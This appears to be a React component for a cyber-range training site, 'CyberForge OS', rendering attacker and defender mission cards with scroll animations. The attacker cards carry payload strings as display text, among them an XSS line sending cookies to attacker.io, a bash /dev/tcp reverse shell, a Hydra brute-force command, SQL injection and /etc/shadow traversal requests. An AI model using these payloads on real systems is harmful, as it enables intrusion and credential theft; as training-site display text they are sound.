import React, { useEffect, useRef, useState } from 'react';
import Lenis from 'lenis';
import { gsap } from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import AttackerParticles from './AttackerParticles';
import DefenderParticles from './DefenderParticles';
import { ChevronDown, LogOut, X, Terminal, Shield } from 'lucide-react';
import './StickyGridScroll.css';

gsap.registerPlugin(ScrollTrigger);

// 9 Tactical Mission Tasks for Attacker
const ATTACKER_TASKS = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    badge: 'Critical Exploit',
    desc: 'Extract database credentials and dump unauthorized schema tables via tainted query inputs.',
    vector: "UNION SELECT null, username, password FROM users WHERE '1'='1' --",
    details: 'Inject unescaped SQL syntax into authentication forms and search endpoints to bypass hash checks and extract administrative privileges.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <ellipse cx="12" cy="5" rx="9" ry="3" />
        <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
        <path d="M3 5v14c0 1.66 4 3 9 3 2.1 0 4.02-.24 5.5-.66" />
        <path d="m17 17 4 4" />
        <path d="m21 17-4 4" />
      </svg>
    )
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting',
    badge: 'High Impact',
    desc: 'Inject stored and reflected JavaScript payloads to hijack active operator sessions.',
    vector: '<script>fetch("//attacker.io/c?"+document.cookie)</script>',
    details: 'Leverage unencoded HTML output to execute client-side scripts, steal authentication tokens, and deface target interface layouts.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="16 18 22 12 16 6" />
        <polyline points="8 6 2 12 8 18" />
        <line x1="12" y1="2" x2="12" y2="22" />
        <path d="m14 8-4 8" />
      </svg>
    )
  },
  {
    id: 'bruteforce',
    title: 'Credential Stuffing',
    badge: 'Auth Vector',
    desc: 'Automated dictionary attacks against administrative login forms to guess operator secrets.',
    vector: 'Hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form',
    details: 'Deploy multi-threaded password spraying against unprotected login portals without rate-limiting or CAPTCHA defenses.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 9.9-1" />
        <circle cx="12" cy="16" r="1.5" />
      </svg>
    )
  },
  {
    id: 'cmd-injection',
    title: 'Command Injection',
    badge: 'Critical Remote Code',
    desc: 'Execute arbitrary host system instructions directly through vulnerable server parameters.',
    vector: '; cat /etc/passwd; id; uname -a',
    details: 'Chain system commands via shell metacharacters through ping or diagnostic endpoints to spawn background reverse shells.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="4 17 10 11 4 5" />
        <line x1="12" y1="19" x2="20" y2="19" />
        <circle cx="17" cy="7" r="3" />
      </svg>
    )
  },
  {
    id: 'priv-esc',
    title: 'Privilege Escalation',
    badge: 'Root Acquisition',
    desc: 'Abuse SUID binaries and kernel misconfigurations to escalate to full root privileges.',
    vector: 'find / -perm -4000 -type f 2>/dev/null; pkexec /bin/sh',
    details: 'Enumerate misconfigured sudo rules, weak permissions, and cron scripts to transition from unprivileged daemon user to superuser.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
        <path d="M12 11v6" />
        <path d="m9 14 3-3 3 3" />
      </svg>
    )
  },
  {
    id: 'traversal',
    title: 'Directory Traversal',
    badge: 'Information Disclosure',
    desc: 'Traverse restricted file system directories to read server configuration and private keys.',
    vector: 'GET /download.php?file=../../../../etc/shadow HTTP/1.1',
    details: 'Bypass document root containment using relative dot-dot-slash path sequences to access internal source files and database configs.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" />
        <path d="m14 12-4 4" />
        <path d="m10 12 4 4" />
      </svg>
    )
  },
  {
    id: 'csrf',
    title: 'CSRF Token Bypass',
    badge: 'State Manipulation',
    desc: 'Forge authenticated state-changing requests executed involuntarily by victim operators.',
    vector: '<img src="http://bank.internal/transfer?amt=50000&to=attacker">',
    details: 'Exploit missing CSRF tokens or insecure SameSite cookie policies to execute account password updates and privilege elevation.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
        <circle cx="9" cy="7" r="4" />
        <line x1="19" y1="8" x2="19" y2="14" />
        <line x1="22" y1="11" x2="16" y2="11" />
      </svg>
    )
  },
  {
    id: 'recon',
    title: 'Network Port Recon',
    badge: 'Reconnaissance',
    desc: 'Map open ports, daemon fingerprints, and exposed internal service surfaces.',
    vector: 'nmap -sS -sV -p- -T4 --script vuln 10.0.0.1/24',
    details: 'Perform non-intrusive SYN stealth scans to map reachable TCP/UDP services, banner versions, and unauthenticated management consoles.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <path d="m4.93 4.93 4.24 4.24" />
        <path d="m14.83 9.17 4.24-4.24" />
        <path d="M12 12v6" />
        <circle cx="12" cy="12" r="2" />
      </svg>
    )
  },
  {
    id: 'c2',
    title: 'Reverse Shell Listener',
    badge: 'Command & Control',
    desc: 'Establish encrypted outbound sockets through restrictive firewalls for persistence.',
    vector: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1',
    details: 'Maintain persistent command-and-control access via obfuscated reverse shell sessions routed through standard egress ports.',
    svg: (
      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="9" />
        <path d="M9 10h.01" />
        <path d="M15 10h.01" />
        <path d="M8 16c1.5-1 3.5-1 5 0" />
        <path d="M12 2v3" />
        <path d="M12 19v3" />
      </svg>
    )
  }
];

// 9 Tactical Mission Tasks for Defender
const DEFENDER_TASKS = [
  {
    id: 'siem',
    title: 'SIEM Log Telemetry',
    badge: 'Detection Priority',
    desc: 'Correlate authentication and proxy access logs to pinpoint active anomaly spikes.',
    vector: 'fail2ban-client status; grep "401 Unauthorized" /var/log/auth.log',
    details: 'Aggregate real-time access telemetry across web gateways and endpoints to detect credential spraying and anomalous origin traffic.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 3v18h18" />
        <path d="m19 9-5 5-4-4-3 3" />
        <circle cx="19" cy="9" r="2" />
      </svg>
    )
  },
  {
    id: 'waf',
    title: 'WAF Filter Rules',
    badge: 'Perimeter Defense',
    desc: 'Deploy regex inspection filters to detect and discard malicious SQLi and XSS probes.',
    vector: 'SecRule REQUEST_URI "@rx (union.*select|script)" "id:1001,deny,status:403"',
    details: 'Configure ModSecurity and Cloud Armor Web Application Firewall rulesets to drop hostile payloads before reaching application containers.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
        <path d="m9 12 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'ids',
    title: 'Intrusion Detection (IDS)',
    badge: 'Traffic Inspection',
    desc: 'Deep packet inspection tracking malformed TCP sequences and known exploit signatures.',
    vector: 'suricata -c /etc/suricata/suricata.yaml -i eth0 --dump-pcap',
    details: 'Inspect network interfaces with Snort/Suricata rules to alert on port sweeps, anomalous ICMP bursts, and shellcode buffers.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 2a10 10 0 1 0 10 10" />
        <path d="m21.5 2.5-9.5 9.5" />
        <circle cx="12" cy="12" r="3" />
      </svg>
    )
  },
  {
    id: 'patching',
    title: 'Patch & Hardening',
    badge: 'System Hardening',
    desc: 'Remediate zero-day CVEs, close inactive ports, and harden daemon configurations.',
    vector: 'apt-get update && apt-get --only-upgrade install openssl nginx',
    details: 'Audit system libraries for vulnerable versions, disable dangerous PHP functions (`exec`, `system`), and restrict root SSH access.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z" />
      </svg>
    )
  },
  {
    id: 'isolation',
    title: 'Incident Containment',
    badge: 'Emergency Response',
    desc: 'Quarantine compromised container instances and isolate affected network segments.',
    vector: 'docker stop target_c1; iptables -A FORWARD -s 172.18.0.5 -j DROP',
    details: 'Instantly isolate compromised workloads from the local bridge network while taking forensic memory snapshots for offline review.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="18" x="3" y="3" rx="2" />
        <line x1="9" y1="9" x2="15" y2="15" />
        <line x1="15" y1="9" x2="9" y2="15" />
      </svg>
    )
  },
  {
    id: 'rbac',
    title: 'Access Control (RBAC)',
    badge: 'Identity Security',
    desc: 'Enforce least-privilege token policies, MFA requirements, and session revocations.',
    vector: 'REVOKE ALL ON database.* FROM "guest"@"%"; FLUSH PRIVILEGES;',
    details: 'Define granular role hierarchies ensuring operators only hold access to approved training targets and monitoring dashboards.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="7" r="4" />
        <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" />
        <path d="m16 11 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'vuln-scan',
    title: 'Vulnerability Audit',
    badge: 'Proactive Audit',
    desc: 'Continuous automated auditing of attack surfaces, TLS configs, and dependencies.',
    vector: 'trivy image target_app:latest; nikto -h http://localhost:8080',
    details: 'Scan live endpoints and container image layers for known vulnerabilities, expired certificates, and misconfigured HTTP headers.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="22" y1="12" x2="18" y2="12" />
        <line x1="6" y1="12" x2="2" y2="12" />
        <line x1="12" y1="6" x2="12" y2="2" />
        <line x1="12" y1="22" x2="12" y2="18" />
      </svg>
    )
  },
  {
    id: 'threat-intel',
    title: 'Threat Intel Feed',
    badge: 'Adversary Profiling',
    desc: 'Ingest real-time adversary tactics (MITRE ATT&CK), CVE databases, and hostile IP pools.',
    vector: 'curl -s https://intel.cyberforge.local/api/feed/ioc | jq .',
    details: 'Synchronize dynamic blocklists with active threat intelligence feeds to preemptively block adversary infrastructure and C2 servers.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <line x1="2" y1="12" x2="22" y2="12" />
        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
      </svg>
    )
  },
  {
    id: 'forensics',
    title: 'Digital Forensics',
    badge: 'Evidence Audit',
    desc: 'Reconstruct adversary timelines through disk artifact extraction and memory dumps.',
    vector: 'volatility -f mem.dmp --profile=Linux6x64 linux_pslist',
    details: 'Capture non-volatile evidence and analyze memory artifacts to determine initial infection vectors and lateral movement timelines.',
    svg: (
      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="11" cy="11" r="8" />
        <line x1="21" y1="21" x2="16.65" y2="16.65" />
        <path d="M11 8v6" />
        <path d="M8 11h6" />
      </svg>
    )
  }
];

export default function RoleLandingPage({ role = 'attacker', email = '', onSignOut }) {
  const isAttacker = role === 'attacker';
  const tasks = isAttacker ? ATTACKER_TASKS : DEFENDER_TASKS;

  const [boomProgress, setBoomProgress] = useState(0);
  const [selectedTask, setSelectedTask] = useState(null);

  const introRef = useRef(null);
  const mainBlockRef = useRef(null);
  const wrapperRef = useRef(null);
  const contentRef = useRef(null);
  const titleRef = useRef(null);
  const descRef = useRef(null);
  const btnRef = useRef(null);
  const gridRef = useRef(null);

  useEffect(() => {
    // 1. Initialize Lenis Smooth Scrolling
    const lenis = new Lenis({
      lerp: 0.08,
      wheelMultiplier: 1.2,
      smoothTouch: true
    });

    lenis.on('scroll', ScrollTrigger.update);

    const tickerCb = (time) => {
      lenis.raf(time * 1000);
    };
    gsap.ticker.add(tickerCb);
    gsap.ticker.lagSmoothing(0);

    // 2. Scroll-driven Particle Explosion
    // When scrolling down past the intro, boomProgress goes from 0 to 1
    const particleTrigger = ScrollTrigger.create({
      trigger: introRef.current,
      start: 'top top',
      end: 'bottom top',
      scrub: true,
      onUpdate: (self) => {
        setBoomProgress(self.progress);
      }
    });

    // 3. Sticky Grid Scroll Parallax & Zoom Implementation
    const blockEl = mainBlockRef.current;
    const wrapperEl = wrapperRef.current;
    const contentEl = contentRef.current;
    const titleEl = titleRef.current;
    const descEl = descRef.current;
    const buttonEl = btnRef.current;
    const gridEl = gridRef.current;

    let items = [];
    if (gridEl) {
      items = Array.from(gridEl.querySelectorAll('.gallery__item'));
    }

    // Distribute items into 3 columns
    const columns = [[], [], []];
    items.forEach((item, index) => {
      columns[index % 3].push(item);
    });

    // Initial content state: hide desc and button, center title
    let titleOffsetY = 0;
    if (descEl && buttonEl) {
      gsap.set([descEl, buttonEl], { opacity: 0, pointerEvents: 'none' });
    }
    if (contentEl && titleEl) {
      const dy = (contentEl.offsetHeight - titleEl.offsetHeight) / 2;
      titleOffsetY = (dy / contentEl.offsetHeight) * 100;
      gsap.set(titleEl, { yPercent: titleOffsetY });
    }

    // Parallax on wrapper
    const parallaxTrigger = gsap.from(wrapperEl, {
      yPercent: -100,
      ease: 'none',
      scrollTrigger: {
        trigger: blockEl,
        start: 'top bottom',
        end: 'top top',
        scrub: true
      }
    });

    // Animate title opacity
    const titleTrigger = gsap.from(titleEl, {
      opacity: 0,
      duration: 0.7,
      ease: 'power1.out',
      scrollTrigger: {
        trigger: blockEl,
        start: 'top 57%',
        toggleActions: 'play none none reset'
      }
    });

    // Grid Reveal Timeline
    const wh = window.innerHeight;
    const dy = wh - (wh - (gridEl?.offsetHeight || 600)) / 2;
    const revealTimeline = gsap.timeline();
    columns.forEach((column, colIndex) => {
      const fromTop = colIndex % 2 === 0;
      revealTimeline.from(
        column,
        {
          y: dy * (fromTop ? -1 : 1),
          stagger: {
            each: 0.06,
            from: fromTop ? 'end' : 'start'
          },
          ease: 'power1.inOut'
        },
        'grid-reveal'
      );
    });

    // Grid Zoom Timeline
    const zoomTimeline = gsap.timeline({ defaults: { duration: 1, ease: 'power3.inOut' } });
    if (gridEl) {
      zoomTimeline.to(gridEl, { scale: 1.85 });
    }
    if (columns[0].length) zoomTimeline.to(columns[0], { xPercent: -35 }, '<');
    if (columns[2].length) zoomTimeline.to(columns[2], { xPercent: 35 }, '<');
    if (columns[1].length) {
      zoomTimeline.to(
        columns[1],
        {
          yPercent: (index) => (index < Math.floor(columns[1].length / 2) ? -1 : 1) * 35,
          duration: 0.5,
          ease: 'power1.inOut'
        },
        '-=0.5'
      );
    }

    // Toggle Content function
    const toggleContent = (isVisible) => {
      if (!titleEl || !descEl || !buttonEl) return;
      gsap.timeline({ defaults: { overwrite: true } })
        .to(titleEl, {
          yPercent: isVisible ? 0 : titleOffsetY,
          duration: 0.7,
          ease: 'power2.inOut'
        })
        .to(
          [descEl, buttonEl],
          {
            opacity: isVisible ? 1 : 0,
            duration: 0.4,
            ease: `power1.${isVisible ? 'inOut' : 'out'}`,
            pointerEvents: isVisible ? 'all' : 'none'
          },
          isVisible ? '-=90%' : '<'
        );
    };

    // Master Grid Scroll Timeline
    const masterTimeline = gsap.timeline({
      scrollTrigger: {
        trigger: blockEl,
        start: 'top 25%',
        end: 'bottom bottom',
        scrub: true
      }
    });

    masterTimeline
      .add(revealTimeline)
      .add(zoomTimeline, '-=0.6')
      .add(() => {
        toggleContent(masterTimeline.scrollTrigger?.direction === 1);
      }, '-=0.32');

    return () => {
      lenis.destroy();
      gsap.ticker.remove(tickerCb);
      particleTrigger.kill();
      parallaxTrigger.kill();
      titleTrigger.kill();
      masterTimeline.kill();
      ScrollTrigger.getAll().forEach((t) => t.kill());
    };
  }, []);

  return (
    <div className="scroll-page selection:bg-white/20">
      {/* Sleek CyberForge HUD Bar */}
      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-6 py-4 bg-black/40 backdrop-blur-md border-b border-white/10 pointer-events-auto">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg bg-[#141724] border border-[#23283b] flex items-center justify-center">
            {isAttacker ? (
              <Terminal className="w-4 h-4 text-red-500" />
            ) : (
              <Shield className="w-4 h-4 text-[#2ab7ff]" />
            )}
          </div>
          <div>
            <span className="text-xs font-mono font-bold tracking-widest text-white uppercase block">
              CyberForge OS
            </span>
            <span className={`text-[10px] font-mono tracking-wider ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`}>
              {isAttacker ? 'ATTACKER PROTOCOL' : 'DEFENDER SHIELD'}
            </span>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="hidden sm:flex items-center gap-2 px-3 py-1 rounded-full bg-[#141724] border border-[#23283b] text-xs font-mono text-zinc-300">
            <span className={`w-2 h-2 rounded-full ${isAttacker ? 'bg-red-500 shadow-[0_0_8px_#ff2a3d]' : 'bg-[#2ab7ff] shadow-[0_0_8px_#2ab7ff]'}`} />
            <span>{email || (isAttacker ? 'attacker@cyberforge.local' : 'defender@cyberforge.local')}</span>
          </div>

          <button
            onClick={onSignOut}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#141724] hover:bg-white/10 border border-[#23283b] text-xs font-mono text-zinc-300 hover:text-white transition-colors"
          >
            <LogOut className="w-3.5 h-3.5" />
            <span>Sign Out</span>
          </button>
        </div>
      </header>

      {/* ---------------- BLOCK INTRO: Fullscreen Particle Canvas ---------------- */}
      <section ref={introRef} className="block--intro">
        {/* Particle Canvas */}
        {isAttacker ? (
          <AttackerParticles boomProgress={boomProgress} />
        ) : (
          <DefenderParticles boomProgress={boomProgress} />
        )}

        {/* Hero Scroll Cue */}
        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-80">
          <span className={`text-[11px] font-mono tracking-widest uppercase ${isAttacker ? 'text-red-300/80' : 'text-sky-300/80'}`}>
            Scroll to Explode & Explore Mission Grid
          </span>
          <ChevronDown className={`w-5 h-5 animate-bounce ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`} />
        </div>
      </section>

      {/* ---------------- BLOCK MAIN: Sticky Parallax & Zoom Grid ---------------- */}
      <section ref={mainBlockRef} className="block block--main">
        <div ref={wrapperRef} className="block__wrapper">
          {/* Centered Content Overlay (revealed upon scroll zoom) */}
          <div ref={contentRef} className="content">
            <h1
              ref={titleRef}
              className={`content__title bg-clip-text text-transparent bg-gradient-to-b ${
                isAttacker
                  ? 'from-white via-zinc-200 to-red-500'
                  : 'from-white via-zinc-200 to-[#2ab7ff]'
              }`}
            >
              {isAttacker ? 'Offensive Protocols' : 'Perimeter Defense'}
            </h1>

            <p ref={descRef} className="content__description">
              {isAttacker
                ? 'EXPLOIT HIGH-VALUE SYSTEM VECTORS, EXTRACT PRIVILEGED CREDENTIALS, AND COMPROMISE TARGET ARCHITECTURES.'
                : 'MONITOR REAL-TIME TELEMETRY, FORMULATE WAF INSPECT FILTERS, AND FORTIFY HOST SECURITY TOPOLOGY.'}
            </p>

            <button
              ref={btnRef}
              onClick={() => alert(`Launching ${isAttacker ? 'Attacker Command Center' : 'Defender Console'}...`)}
              className={`content__button inline-flex items-center gap-2 px-7 py-3 rounded-xl border shadow-lg ${
                isAttacker
                  ? 'bg-red-950/40 hover:bg-red-900/60 border-red-500/50 text-red-200 shadow-red-500/20'
                  : 'bg-sky-950/40 hover:bg-sky-900/60 border-[#2ab7ff]/50 text-[#dbf5ff] shadow-[#2ab7ff]/20'
              }`}
            >
              <span>{isAttacker ? 'Engage War Room →' : 'Activate SOC Console →'}</span>
            </button>
          </div>

          {/* 3-Column Tactical Task Gallery Grid */}
          <div className="gallery">
            <div ref={gridRef} className="gallery__grid">
              {tasks.map((task) => (
                <div key={task.id} className="gallery__item">
                  <div
                    className={`cyber-card bg-[#0b0d15]/95 border ${
                      isAttacker
                        ? 'border-[#26141a] hover:border-red-500/60 hover:shadow-[0_0_24px_rgba(255,42,61,0.25)]'
                        : 'border-[#152336] hover:border-[#2ab7ff]/60 hover:shadow-[0_0_24px_rgba(42,183,255,0.25)]'
                    }`}
                  >
                    <div>
                      {/* Card Header with Icon & Badge */}
                      <div className="flex items-center justify-between mb-2 sm:mb-3">
                        <div
                          className={`p-2 rounded-xl ${
                            isAttacker
                              ? 'bg-red-950/50 border border-red-500/30'
                              : 'bg-sky-950/50 border border-[#2ab7ff]/30'
                          }`}
                        >
                          {task.svg}
                        </div>
                        <span
                          className={`text-[9px] sm:text-[10px] font-mono px-2 py-0.5 rounded-full border ${
                            isAttacker
                              ? 'bg-red-950/40 text-red-300 border-red-500/30'
                              : 'bg-sky-950/40 text-sky-300 border-[#2ab7ff]/30'
                          }`}
                        >
                          {task.badge}
                        </span>
                      </div>

                      {/* Card Title & Desc */}
                      <h3 className="text-xs sm:text-sm md:text-base font-bold text-white mb-1 tracking-tight">
                        {task.title}
                      </h3>
                      <p className="text-[10px] sm:text-xs text-zinc-400 line-clamp-2 sm:line-clamp-3 leading-relaxed">
                        {task.desc}
                      </p>
                    </div>

                    {/* "More ->" Link */}
                    <div className="pt-2 border-t border-white/5 flex items-center justify-between">
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedTask(task);
                        }}
                        className={`inline-flex items-center gap-1.5 text-xs font-mono font-bold group-hover:underline ${
                          isAttacker ? 'text-red-400 hover:text-red-300' : 'text-[#2ab7ff] hover:text-[#7ad6ff]'
                        }`}
                      >
                        <span>More</span>
                        <span className="transition-transform group-hover:translate-x-1">→</span>
                      </button>
                      <span className="text-[10px] font-mono text-zinc-600">CyberForge</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- TACTICAL TASK MODAL ("More ->") ---------------- */}
      {selectedTask && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div
            className={`w-full max-w-lg bg-[#0e111a] border rounded-2xl p-6 sm:p-8 shadow-2xl relative overflow-hidden ${
              isAttacker ? 'border-red-500/40' : 'border-[#2ab7ff]/40'
            }`}
          >
            {/* Modal Ambient Top Glow */}
            <div
              className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent ${
                isAttacker ? 'via-red-500' : 'via-[#2ab7ff]'
              } to-transparent`}
            />

            {/* Modal Header */}
            <div className="flex items-start justify-between mb-5">
              <div className="flex items-center gap-3">
                <div
                  className={`p-3 rounded-xl ${
                    isAttacker
                      ? 'bg-red-950/50 border border-red-500/40 text-red-400'
                      : 'bg-sky-950/50 border border-[#2ab7ff]/40 text-[#2ab7ff]'
                  }`}
                >
                  {selectedTask.svg}
                </div>
                <div>
                  <h3 className="text-lg font-bold text-white tracking-tight">{selectedTask.title}</h3>
                  <span
                    className={`inline-block text-[11px] font-mono uppercase tracking-wider ${
                      isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'
                    }`}
                  >
                    {selectedTask.badge}
                  </span>
                </div>
              </div>
              <button
                onClick={() => setSelectedTask(null)}
                className="p-1.5 rounded-lg bg-zinc-800/60 hover:bg-zinc-700 text-zinc-400 hover:text-white transition-colors"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            {/* Modal Body */}
            <div className="space-y-4 text-xs sm:text-sm text-zinc-300 leading-relaxed">
              <div>
                <span className="block text-[11px] font-mono uppercase text-zinc-500 mb-1">Mission Objective</span>
                <p className="bg-[#141824] p-3 rounded-xl border border-white/5 font-mono text-zinc-200">
                  {selectedTask.details}
                </p>
              </div>

              <div>
                <span className="block text-[11px] font-mono uppercase text-zinc-500 mb-1">
                  {isAttacker ? 'Exploit Vector Signature' : 'Defense Rule Signature'}
                </span>
                <div className="bg-[#08090f] p-3 rounded-xl border border-white/10 font-mono text-[11px] sm:text-xs overflow-x-auto text-amber-300/90">
                  <code>{selectedTask.vector}</code>
                </div>
              </div>
            </div>

            {/* Modal Footer */}
            <div className="mt-6 pt-4 border-t border-white/10 flex items-center justify-between">
              <span className="text-[11px] font-mono text-zinc-500">CyberForge Operator Module</span>
              <button
                onClick={() => setSelectedTask(null)}
                className={`px-5 py-2 rounded-xl text-xs font-semibold text-white transition-all ${
                  isAttacker
                    ? 'bg-gradient-to-r from-red-600 to-red-700 hover:from-red-500 hover:to-red-600 shadow-[0_0_15px_rgba(255,42,61,0.4)]'
                    : 'bg-gradient-to-r from-sky-500 to-sky-600 hover:from-sky-400 hover:to-sky-500 shadow-[0_0_15px_rgba(42,183,255,0.4)]'
                }`}
              >
                Close Briefing
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
